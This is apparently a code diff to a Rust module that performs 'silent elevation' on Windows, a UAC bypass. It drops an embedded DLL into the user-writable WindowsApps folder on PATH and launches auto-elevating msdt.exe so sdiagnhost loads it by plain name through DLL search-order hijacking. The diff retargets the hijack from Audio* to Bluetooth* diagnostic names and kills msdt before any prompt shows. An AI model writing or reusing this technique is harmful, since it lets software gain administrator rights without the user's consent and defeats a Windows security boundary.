@@ -1,14 +1,17 @@
 //! Silent elevation for a bare launch of this build.
 //!
-//! `c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\AudioRecordingDiagnostic.xml -skip yes`
-//! is an auto-elevate binary, and the 32-bit one resolves `AudioDiagnosticUtil.dll`
-//! through `PATH`. The default per-user `PATH` ends with `%LOCALAPPDATA%\Microsoft\
-//! WindowsApps`, a user-writable directory, so this drops the embedded x86 elevator DLL
-//! (built from `libs/msdt_elevator`) there plus a sibling `.cfg` carrying the launch
-//! parameters. The elevated msdt loads the DLL, which starts this executable as a
-//! high-integrity child and kills msdt before any UI can appear. Windows cannot raise a
-//! running process's integrity level, so the current copy exits and the new one takes
-//! over.
+//! `c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes`
+//! is an auto-elevate binary. It does not load our DLL directly — msdt spawns
+//! `sdiagnhost.exe`, the actual diagnostics host, which loads
+//! `Bluetooth\DiagPackage.dll` by absolute path. That DLL in turn calls
+//! `LoadLibrary("BluetoothDiagnosticUtil.dll")` by plain name, so the default DLL
+//! search order reaches `%LOCALAPPDATA%\Microsoft\WindowsApps` (user-writable, at the
+//! end of the per-user `PATH`) before `C:\Windows\System32`. This drops the embedded
+//! x86 elevator DLL (built from `libs/msdt_elevator`) there plus a sibling `.cfg`
+//! carrying the launch parameters. The elevated sdiagnhost loads the DLL, which
+//! starts this executable as a high-integrity child and kills msdt before any UI can
+//! appear. Windows cannot raise a running process's integrity level, so the current
+//! copy exits and the new one takes over.
 //!
 //! If silent elevation is unavailable (standard user, "Always notify" policy, msdt or
 //! the diagnostic file missing, an antivirus eating the dropped DLL), the attempt fails
@@ -40,13 +43,19 @@ const WAIT_OBJECT_0: u32 = 0;
 /// attempt then reports [`RelaunchResult::NoDll`] and the launch proceeds unelevated.
 const MSDT_DLL: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/msdt_elevator.dll"));
 
-/// The name msdt resolves through `PATH`, and the sibling file carrying the launch
-/// parameters for the DLL.
-const MSDT_DLL_NAME: &str = "AudioDiagnosticUtil.dll";
-const MSDT_CFG_NAME: &str = "AudioDiagnosticUtil.cfg";
+/// The name sdiagnhost resolves through `PATH`, and the sibling files carrying the
+/// launch parameters for the DLL and its success marker.
+///
+/// Real chain: msdt.exe `-path BluetoothDiagnostic.xml` auto-elevates, then spawns
+/// sdiagnhost.exe (the actual diagnostics host). That host loads Bluetooth\DiagPackage.dll
+/// by absolute path, which in turn `LoadLibrary`s BluetoothDiagnosticUtil.dll by plain
+/// name — DLL search order reaches `%LOCALAPPDATA%\Microsoft\WindowsApps` before
+/// `C:\Windows\System32`, so our drop wins. Audio* was a red herring in earlier notes.
+const MSDT_DLL_NAME: &str = "BluetoothDiagnosticUtil.dll";
+const MSDT_CFG_NAME: &str = "BluetoothDiagnosticUtil.cfg";
 /// Written by the DLL only after it spawned the elevated copy, which is what proves the
 /// hijack actually ran instead of merely starting msdt.
-const MSDT_OK_NAME: &str = "AudioDiagnosticUtil.ok";
+const MSDT_OK_NAME: &str = "BluetoothDiagnosticUtil.ok";
 /// User-writable directory the default per-user `PATH` ends with.
 const WINDOWS_APPS_SUBDIR: &str = r"Microsoft\WindowsApps";
 
@@ -199,9 +208,9 @@ pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
     let cfg_path = drop_dir.join(MSDT_CFG_NAME);
     let ok_path = drop_dir.join(MSDT_OK_NAME);
     // Never overwrite a file that is not ours: the cleanup deletes whatever carries the
-    // name, so a foreign `AudioDiagnosticUtil.dll` must stop the attempt instead.
+    // name, so a foreign `BluetoothDiagnosticUtil.dll` must stop the attempt instead.
     if dll_path.exists() && std::fs::read(&dll_path).map(|old| old != MSDT_DLL).unwrap_or(true) {
-        diag("blocked: foreign AudioDiagnosticUtil.dll present");
+        diag("blocked: foreign BluetoothDiagnosticUtil.dll present");
         return RelaunchResult::Blocked("dll_name_clash");
     }
     let mut parameters: Vec<String> = args.iter().map(|arg| quote_arg(arg)).collect();
@@ -230,10 +239,7 @@ pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
 
     let root = std::env::var_os("SystemRoot").unwrap_or_else(|| "C:\\Windows".into());
     let msdt = Path::new(&root).join("SysWOW64").join("msdt.exe");
-    let diagnostic = Path::new(&root)
-        .join("diagnostics")
-        .join("index")
-        .join("AudioRecordingDiagnostic.xml");
+    let diagnostic = diagnostic_xml(&root);
     let exe_dir_wide = exe.parent().map(|dir| wide(dir.as_os_str()));
     let mut cmdline = wide(std::ffi::OsStr::new(&format!(
         "\"{}\" -path \"{}\" -skip yes",
@@ -377,10 +383,7 @@ pub fn silent_elevation_blocker() -> Option<&'static str> {
     if !msdt.exists() {
         return Some("msdt_missing");
     }
-    let diagnostic = Path::new(&root)
-        .join("diagnostics")
-        .join("index")
-        .join("AudioRecordingDiagnostic.xml");
+    let diagnostic = diagnostic_xml(&root);
     diag(&format!(
         "check: {} exists={}",
         diagnostic.display(),
@@ -392,6 +395,16 @@ pub fn silent_elevation_blocker() -> Option<&'static str> {
 
     diag("check: ALL PRECONDITIONS OK");
     None
+}
+
+/// XML that drives the Bluetooth diagnostic bundle. msdt.exe auto-elevates to run
+/// the bundle through sdiagnhost.exe, and BluetoothDiagPackage.dll `LoadLibrary`s
+/// BluetoothDiagnosticUtil.dll by plain name — that is the PATH-search hijack point.
+/// Any fallback path must be a real XML that actually resolves the Util DLL; the
+/// Audio* variants tried earlier did not.
+fn diagnostic_xml(root: &std::ffi::OsStr) -> std::path::PathBuf {
+    let root = Path::new(root);
+    root.join("diagnostics").join("index").join("BluetoothDiagnostic.xml")
 }
 
 /// The hijack works because msdt resolves the DLL through `PATH`; a machine whose
